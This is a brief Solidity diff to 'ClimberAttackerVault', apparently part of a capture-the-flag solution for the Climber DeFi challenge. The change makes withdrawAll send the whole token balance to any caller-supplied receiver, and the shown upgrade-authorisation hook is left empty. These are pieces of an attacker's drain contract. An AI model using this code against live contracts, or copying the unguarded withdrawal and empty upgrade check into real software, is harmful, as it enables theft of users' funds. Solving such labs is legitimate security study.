@@ -9,7 +9,7 @@ contract ClimberAttackerVault is UUPSUpgradeable {
     }
 
     function withdrawAll(IERC20 token, address receiver) external {
-        token.transfer(owner, token.balanceOf(address(this)));
+        token.transfer(receiver, token.balanceOf(address(this)));
     }
 
     function _authorizeUpgrade(address newImplementation) internal override {}
